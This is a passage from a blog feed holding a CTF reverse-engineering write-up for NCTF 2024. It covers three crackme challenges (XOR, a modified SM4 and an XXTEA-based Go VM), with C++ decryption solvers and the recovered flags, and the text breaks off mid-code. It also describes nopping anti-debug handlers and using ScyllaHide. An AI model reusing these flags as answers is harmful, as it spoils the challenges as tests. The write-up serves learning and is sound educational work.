<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Liv&#39;s blog</title>
  
  <subtitle>CTF blog</subtitle>
  <link href="https://tkazer.github.io/atom.xml" rel="self"/>
  
  <link href="https://tkazer.github.io/"/>
  <updated>2025-03-24T13:35:40.978Z</updated>
  <id>https://tkazer.github.io/</id>
  
  <author>
    <name>Liv</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>NCTF2024</title>
    <link href="https://tkazer.github.io/2025/03/24/NCTF2024/"/>
    <id>https://tkazer.github.io/2025/03/24/NCTF2024/</id>
    <published>2025-03-24T11:12:53.000Z</published>
    <updated>2025-03-24T13:35:40.978Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NCTF-2024-Reverse-WP"><a href="#NCTF-2024-Reverse-WP" class="headerlink" title="NCTF 2024 Reverse WP"></a>NCTF 2024 Reverse WP</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次也是擦边#6拿下奖金，组队的师傅们都十分强大，合力拿下。</p><p>Re这次摸了三题，剩一题安卓不太熟悉安卓逆向看了一眼就没做，但是赛后发现其实没那么难（。ezDOS 8086汇编题刚好撞上我GHCTF出的题，很熟悉直接秒了，偷摸了个一血。然后gogo这题的golang vm研究了挺久，拿下了三血，实际加密不是很复杂。总体下来这几题re出的都挺不错，收获也很多，对vm的题型也更加熟悉了。</p><h2 id="ezDOS"><a href="#ezDOS" class="headerlink" title="ezDOS"></a>ezDOS</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>程序中间出现的花指令都直接nop去除，然后Apply patch到程序。</p><p><img src="/2025/03/24/NCTF2024/image.png" alt="alt text"></p><p>程序要求输入38长度字符串，然后进行一系列变种类RC4算法加密，然后与0x141地址的38字节数据进行比对。</p><p><img src="/2025/03/24/NCTF2024/image-1.png" alt="alt text"></p><p>使用dosbox动调，在FA代码处是对取出的al对输入的字符串进行xor加密。0x32是取出的异或值，0x31是输入的字符’1’。</p><p><img src="/2025/03/24/NCTF2024/image-2.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-3.png" alt="alt text"></p><p>直接debug一直循环执行这边，即可拿到对输入字符串异或的一系列异或值。</p><p><code>32 7d 59 7a f3 0d b3 7b 64 8c eb 28 c4 a4 50 30 a0 ed 27 6a e3 76 69 0c da 28 f8 08 ba a6 17 3e 12 59 45 06 4e f1</code></p><p>取出0x142地址的38字节，进行异或即可得到解密flag。</p><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p><img src="/2025/03/24/NCTF2024/image-4.png" alt="alt text"></p><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p><code>NCTF&#123;Y0u+Ar3_Assemb1y_M4st3r_5d0b497e&#125;</code></p><h2 id="SafeProgram"><a href="#SafeProgram" class="headerlink" title="SafeProgram"></a>SafeProgram</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>核心加密是一个SM4加密。</p><p><img src="/2025/03/24/NCTF2024/image-5.png" alt="alt text"></p><p>查看byte_14002A0D0数组交叉引用，发现在其他函数被访问过。</p><p><img src="/2025/03/24/NCTF2024/image-6.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-7.png" alt="alt text"></p><p>发现是在VEH异常Handler里面调用的，第一个AddVectoredExceptionHandler得直接nop，不然运行就直接退出。</p><p><img src="/2025/03/24/NCTF2024/image-8.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-9.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-10.png" alt="alt text"></p><p>然后在这个函数开头断点，使用ScyllaHide插件一键去除反调试，防止其他地方的反调试。</p><p><img src="/2025/03/24/NCTF2024/image-11.png" alt="alt text"></p><p>main函数可以看到要求输入格式为NCTF{…}的长度38字符串，然后运行到箭头函数会触发除0异常，然后就会触发VEH那个Handler导致那个byte数组被修改，需要提取的数据是被改后的。</p><p><img src="/2025/03/24/NCTF2024/image-12.png" alt="alt text"></p><p>动调时提取这三个数组数据，进行解密即可。</p><p><img src="/2025/03/24/NCTF2024/image-13.png" alt="alt text"></p><p>key是main函数两次memcpy那边的数据，结果如下。</p><p><img src="/2025/03/24/NCTF2024/image-14.png" alt="alt text"></p><h3 id="解密-1"><a href="#解密-1" class="headerlink" title="解密"></a>解密</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> byte_7FF699A4A0D0[<span class="number">256</span>] = &#123;</span><br><span class="line">    <span class="number">0xD1</span>, <span class="number">0x90</span>, <span class="number">0xE9</span>, <span class="number">0xFE</span>, <span class="number">0xCC</span>, <span class="number">0xE1</span>, <span class="number">0x3D</span>, <span class="number">0xB7</span>, <span class="number">0x16</span>, <span class="number">0xB6</span>, <span class="number">0x14</span>, <span class="number">0xC2</span>, <span class="number">0x28</span>, <span class="number">0xFB</span>, <span class="number">0x2C</span>, <span class="number">0x05</span>,</span><br><span class="line">    <span class="number">0x2B</span>, <span class="number">0x67</span>, <span class="number">0x9A</span>, <span class="number">0x76</span>, <span class="number">0x2A</span>, <span class="number">0xBE</span>, <span class="number">0x04</span>, <span class="number">0xC3</span>, <span class="number">0xAA</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>, <span class="number">0x06</span>, <span class="number">0x99</span>,</span><br><span class="line">    <span class="number">0x9C</span>, <span class="number">0x42</span>, <span class="number">0x50</span>, <span class="number">0xF4</span>, <span class="number">0x91</span>, <span class="number">0xEF</span>, <span class="number">0x98</span>, <span class="number">0x7A</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0B</span>, <span class="number">0x43</span>, <span class="number">0xED</span>, <span class="number">0xCF</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>,</span><br><span class="line">    <span class="number">0xE4</span>, <span class="number">0xB3</span>, <span class="number">0x17</span>, <span class="number">0xA9</span>, <span class="number">0x1C</span>, <span class="number">0x08</span>, <span class="number">0xE8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xDF</span>, <span class="number">0x94</span>, <span class="number">0xFA</span>, <span class="number">0x75</span>, <span class="number">0x8F</span>, <span class="number">0x3F</span>, <span class="number">0xA6</span>,</span><br><span class="line">    <span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0xA7</span>, <span class="number">0x4F</span>, <span class="number">0xF3</span>, <span class="number">0x73</span>, <span class="number">0x71</span>, <span class="number">0xBA</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3C</span>, <span class="number">0x19</span>, <span class="number">0xE6</span>, <span class="number">0x85</span>, <span class="number">0xD6</span>, <span class="number">0xA8</span>,</span><br><span class="line">    <span class="number">0x68</span>, <span class="number">0x6B</span>, <span class="number">0x81</span>, <span class="number">0xB2</span>, <span class="number">0xFC</span>, <span class="number">0x64</span>, <span class="number">0xDA</span>, <span class="number">0x8B</span>, <span class="number">0xF8</span>, <span class="number">0xEB</span>, <span class="number">0x0F</span>, <span class="number">0x4B</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9D</span>, <span class="number">0x35</span>,</span><br><span class="line">    <span class="number">0x1E</span>, <span class="number">0x24</span>, <span class="number">0x0E</span>, <span class="number">0x78</span>, <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0x9F</span>, <span class="number">0xA2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7C</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0xC9</span>, <span class="number">0x87</span>,</span><br><span class="line">    <span class="number">0xD4</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x5E</span>, <span class="number">0xD3</span>, <span class="number">0x27</span>, <span class="number">0x52</span>, <span class="number">0x4C</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0xE7</span>, <span class="number">0xA0</span>, <span class="number">0xC4</span>, <span class="number">0xC8</span>, <span class="number">0x9E</span>,</span><br><span class="line">    <span class="number">0xEA</span>, <span class="number">0xBF</span>, <span class="number">0x8A</span>, <span class="number">0xD2</span>, <span class="number">0x40</span>, <span class="number">0xC7</span>, <span class="number">0x38</span>, <span class="number">0xB5</span>, <span class="number">0xA3</span>, <span class="number">0xF7</span>, <span class="number">0xF2</span>, <span class="number">0xCE</span>, <span class="number">0xF9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xA1</span>,</span><br><span class="line">    <span class="number">0xE0</span>, <span class="number">0xAE</span>, <span class="number">0x5D</span>, <span class="number">0xA4</span>, <span class="number">0x9B</span>, <span class="number">0x34</span>, <span class="number">0x1A</span>, <span class="number">0x55</span>, <span class="number">0xAD</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xF5</span>, <span class="number">0x8C</span>, <span class="number">0xB1</span>, <span class="number">0xE3</span>,</span><br><span class="line">    <span class="number">0x1D</span>, <span class="number">0xF6</span>, <span class="number">0xE2</span>, <span class="number">0x2E</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xCA</span>, <span class="number">0x60</span>, <span class="number">0xC0</span>, <span class="number">0x29</span>, <span class="number">0x23</span>, <span class="number">0xAB</span>, <span class="number">0x0D</span>, <span class="number">0x53</span>, <span class="number">0x4E</span>, <span class="number">0x6F</span>,</span><br><span class="line">    <span class="number">0xD5</span>, <span class="number">0xDB</span>, <span class="number">0x37</span>, <span class="number">0x45</span>, <span class="number">0xDE</span>, <span class="number">0xFD</span>, <span class="number">0x8E</span>, <span class="number">0x2F</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x6A</span>, <span class="number">0x72</span>, <span class="number">0x6D</span>, <span class="number">0x6C</span>, <span class="number">0x5B</span>, <span class="number">0x51</span>,</span><br><span class="line">    <span class="number">0x8D</span>, <span class="number">0x1B</span>, <span class="number">0xAF</span>, <span class="number">0x92</span>, <span class="number">0xBB</span>, <span class="number">0xDD</span>, <span class="number">0xBC</span>, <span class="number">0x7F</span>, <span class="number">0x11</span>, <span class="number">0xD9</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>, <span class="number">0x1F</span>, <span class="number">0x10</span>, <span class="number">0x5A</span>, <span class="number">0xD8</span>,</span><br><span class="line">    <span class="number">0x0A</span>, <span class="number">0xC1</span>, <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xA5</span>, <span class="number">0xCD</span>, <span class="number">0x7B</span>, <span class="number">0xBD</span>, <span class="number">0x2D</span>, <span class="number">0x74</span>, <span class="number">0xD0</span>, <span class="number">0x12</span>, <span class="number">0xB8</span>, <span class="number">0xE5</span>, <span class="number">0xB4</span>, <span class="number">0xB0</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4A</span>, <span class="number">0x0C</span>, <span class="number">0x96</span>, <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0xB9</span>, <span class="number">0xF1</span>, <span class="number">0x09</span>, <span class="number">0xC5</span>, <span class="number">0x6E</span>, <span class="number">0xC6</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0xF0</span>, <span class="number">0x7D</span>, <span class="number">0xEC</span>, <span class="number">0x3A</span>, <span class="number">0xDC</span>, <span class="number">0x4D</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xEE</span>, <span class="number">0x5F</span>, <span class="number">0x3E</span>, <span class="number">0xD7</span>, <span class="number">0xCB</span>, <span class="number">0x39</span>, <span class="number">0x48</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> dword_7FF699A4A040[<span class="number">32</span>] = &#123;</span><br><span class="line">    <span class="number">0x00070E15</span>, <span class="number">0x1C232A31</span>, <span class="number">0x383F464D</span>, <span class="number">0x545B6269</span>, <span class="number">0x70777E85</span>, <span class="number">0x8C939AA1</span>, <span class="number">0xA8AFB6BD</span>, <span class="number">0xC4CBD2D9</span>,</span><br><span class="line">    <span class="number">0xE0E7EEF5</span>, <span class="number">0xFC030A11</span>, <span class="number">0x181F262D</span>, <span class="number">0x343B4249</span>, <span class="number">0x50575E65</span>, <span class="number">0x6C737A81</span>, <span class="number">0x888F969D</span>, <span class="number">0xA4ABB2B9</span>,</span><br><span class="line">    <span class="number">0xC0C7CED5</span>, <span class="number">0xDCE3EAF1</span>, <span class="number">0xF8FF060D</span>, <span class="number">0x141B2229</span>, <span class="number">0x30373E45</span>, <span class="number">0x4C535A61</span>, <span class="number">0x686F767D</span>, <span class="number">0x848B9299</span>,</span><br><span class="line">    <span class="number">0xA0A7AEB5</span>, <span class="number">0xBCC3CAD1</span>, <span class="number">0xD8DFE6ED</span>, <span class="number">0xF4FB0209</span>, <span class="number">0x10171E25</span>, <span class="number">0x2C333A41</span>, <span class="number">0x484F565D</span>, <span class="number">0x646B7279</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> dword_7FF699A4A028[<span class="number">4</span>] = &#123;</span><br><span class="line"><span class="number">0xA3B1BAC6</span>, <span class="number">0x56AA3350</span>, <span class="number">0x677D9197</span>, <span class="number">0xB27022DC</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title">rotate_left</span><span class="params">(<span class="type">uint32_t</span> x, <span class="type">int</span> n)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (x &lt;&lt; n) | (x &gt;&gt; (<span class="number">32</span> - n));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">generate_buf</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* key, <span class="type">uint32_t</span>* buf)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">uint32_t</span> key_dword;</span><br><span class="line">            <span class="built_in">memcpy</span>(&amp;key_dword, key + <span class="number">4</span> * i, <span class="number">4</span>);</span><br><span class="line">            <span class="type">uint32_t</span> converted_key = ((key_dword &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">24</span>) |</span><br><span class="line">            ((key_dword &amp; <span class="number">0xFF00</span>) &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">            ((key_dword &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF00</span>) |</span><br><span class="line">            ((key_dword &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">            buf[i] = dword_7FF699A4A028[i] ^ converted_key;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j++) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">uint32_t</span> v12 = dword_7FF699A4A040[j] ^ buf[j + <span class="number">3</span>] ^ buf[j + <span class="number">2</span>] ^ buf[j + <span class="number">1</span>];</span><br><span class="line">            <span class="type">uint8_t</span>* v12_bytes = (<span class="type">uint8_t</span>*)&amp;v12;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++)</span><br><span class="line">                &#123;</span><br><span class="line">                    v12_bytes[k] = byte_7FF699A4A0D0[v12_bytes[k]];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">uint32_t</span> rot1 = <span class="built_in">rotate_left</span>(v12, <span class="number">23</span>);</span><br><span class="line">        <span class="type">uint32_t</span> rot2 = <span class="built_in">rotate_left</span>(v12, <span class="number">13</span>);</span><br><span class="line">        buf[j + <span class="number">4</span>] = (rot1 ^ rot2 ^ v12) ^ buf[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* ciphertext, <span class="type">const</span> <span class="type">uint8_t</span>* key, <span class="type">uint8_t</span>* plaintext)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> buf[<span class="number">36</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> buf_1[<span class="number">36</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">generate_buf</span>(key, buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> ii = <span class="number">0</span>; ii &lt; <span class="number">4</span>; ii++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint32_t</span> cipher_dword;</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;cipher_dword, ciphertext + <span class="number">4</span> * ii, <span class="number">4</span>);</span><br><span class="line">        buf_1[<span class="number">35</span> - ii] = ((cipher_dword &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>) |</span><br><span class="line">            ((cipher_dword &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF00</span>) |</span><br><span class="line">            ((cipher_dword &lt;&lt; <span class="number">8</span>) &amp; <span class="number">0xFF0000</span>) |</span><br><span class="line">            ((cipher_dword &lt;&lt; <span class="number">24</span>) &amp; <span class="number">0xFF000000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> m = <span class="number">31</span>; m &gt;= <span class="number">0</span>; m--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint32_t</span> v12_0 = buf[m + <span class="number">4</span>] ^ buf_1[m + <span class="number">3</span>] ^ buf_1[m + <span class="number">2</span>] ^ buf_1[m + <span class="number">1</span>];</span><br><span class="line">        <span class="type">uint8_t</span>* v12_bytes = (<span class="type">uint8_t</span>*)&amp;v12_0;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> n = <span class="number">0</span>; n &lt; <span class="number">4</span>; n++) </span><br><span class="line">        &#123;</span><br><span class="line">            v12_bytes[n] = byte_7FF699A4A0D0[v12_bytes[n]];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">uint32_t</span> rot1 = <span class="built_in">rotate_left</span>(v12_0, <span class="number">24</span>);</span><br><span class="line">        <span class="type">uint32_t</span> rot2 = <span class="built_in">rotate_left</span>(v12_0, <span class="number">18</span>);</span><br><span class="line">        <span class="type">uint32_t</span> rot3 = <span class="built_in">rotate_left</span>(v12_0, <span class="number">10</span>);</span><br><span class="line">        <span class="type">uint32_t</span> rot4 = <span class="built_in">rotate_left</span>(v12_0, <span class="number">2</span>);</span><br><span class="line">        <span class="type">uint32_t</span> L_result = rot1 ^ rot2 ^ rot3 ^ rot4 ^ v12_0;</span><br><span class="line">        buf_1[m] = buf_1[m + <span class="number">4</span>] ^ L_result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">uint32_t</span> v11 = buf_1[i];</span><br><span class="line">        <span class="type">uint8_t</span> b0 = (v11 &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        <span class="type">uint8_t</span> b1 = (v11 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        <span class="type">uint8_t</span> b2 = (v11 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        <span class="type">uint8_t</span> b3 = v11 &amp; <span class="number">0xFF</span>;</span><br><span class="line">        <span class="type">uint32_t</span> le = (b3 &lt;&lt; <span class="number">24</span>) | (b2 &lt;&lt; <span class="number">16</span>) | (b1 &lt;&lt; <span class="number">8</span>) | b0;</span><br><span class="line">        <span class="built_in">memcpy</span>(plaintext + <span class="number">4</span> * i, &amp;le, <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main_safe</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint8_t</span> key[] = <span class="string">&quot;NCTF24nctfNCTF24&quot;</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc[<span class="number">32</span>] = &#123;</span><br><span class="line">    <span class="number">0xFB</span>, <span class="number">0x97</span>, <span class="number">0x3C</span>, <span class="number">0x3B</span>, <span class="number">0xF1</span>, <span class="number">0x99</span>, <span class="number">0x12</span>, <span class="number">0xDF</span>, <span class="number">0x13</span>, <span class="number">0x30</span>, <span class="number">0xF7</span>, <span class="number">0xD8</span>, <span class="number">0x7F</span>, <span class="number">0xEB</span>, <span class="number">0xA0</span>, <span class="number">0x6C</span>,</span><br><span class="line">    <span class="number">0x14</span>, <span class="number">0x5B</span>, <span class="number">0xA6</span>, <span class="number">0x2A</span>, <span class="number">0xA8</span>, <span class="number">0x05</span>, <span class="number">0xA5</span>, <span class="number">0xF3</span>, <span class="number">0x76</span>, <span class="number">0xBE</span>, <span class="number">0xC9</span>, <span class="number">0x01</span>, <span class="number">0xF9</span>, <span class="number">0x36</span>, <span class="number">0x7B</span>, <span class="number">0x46</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flag[<span class="number">32</span>]&#123;&#125;;</span><br><span class="line">    <span class="built_in">decrypt</span>(enc, key, flag);</span><br><span class="line">    <span class="built_in">decrypt</span>(enc<span class="number">+16</span>, key, flag<span class="number">+16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;NCTF&#123;%.32s&#125;\n&quot;</span>, flag);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h3><p><code>NCTF&#123;58cb925e0cd823c0d0b54fd06b820b7e&#125;</code></p><h2 id="gogo"><a href="#gogo" class="headerlink" title="gogo"></a>gogo</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>main_main函数可以看到是将输入分块通过channel进行协程通信。</p><p><img src="/2025/03/24/NCTF2024/image-15.png" alt="alt text"></p><p>在main_main函数附近有一个带VM名字的函数，里面就是接收main那边发送的数据，然后底下有个函数执行，是通过操作数进行调用VM函数计算。这边一系列计算函数也印证想法。</p><p><img src="/2025/03/24/NCTF2024/image-16.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-17.png" alt="alt text"></p><p>对每个vm的函数都下断点输出执行的指令以及操作数，方便分析整个加密流程，如main_XOR函数断点：</p><p><img src="/2025/03/24/NCTF2024/image-18.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-19.png" alt="alt text"></p><p>运行输入38个’1’（数据简单方便分析算法），可以得到一堆我们输出的伪代码计算过程，通过看到9e3779b9以及计算的特征，可以发现是XXTEA变种。</p><p>31313131就是我们输入的字符串的字节，不过是以4字节为单位进行运算。</p><p>通过分析可得知是将输入的flag分成两份，20字节为一组，分别进行两种变种XXTEA计算，Key也不一样，不过都在这里面可以找到Key。</p><p><img src="/2025/03/24/NCTF2024/image-20.png" alt="alt text"></p><p><img src="/2025/03/24/NCTF2024/image-21.png" alt="alt text"></p><p>可以根据伪代码计算流程进行还原成代码，基于标准XXTEA进行编写，中间可以对比标准算法发现异或Key的值在哪，以及根据加密计算的一些中间值来验证加密代码，最终加密值就可以根据伪代码尾部最终值来验证。（这边不具体赘述）</p><p><img src="/2025/03/24/NCTF2024/image-23.png" alt="alt text"></p><p>还原加密代码如下，基于标准XXTEA进行修改的：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z &gt;&gt; 5 ^ y <span class="string">&lt;&lt; 2) + (y &gt;</span>&gt; 3 ^ z &lt;&lt; 4)) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX2 (((z <span class="string">&lt;&lt; 5 ^ y &gt;</span>&gt; 2) + (y <span class="string">&lt;&lt; 3 ^ z &gt;</span>&gt; 4)) ^ ((sum ^ y) + (key2[(p &amp; 3) ^ e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> key[]&#123; <span class="number">0x6e637466</span>, <span class="number">0x62ef0ed</span> ,<span class="number">0xa78c0b4f</span>, <span class="number">0x32303234</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> 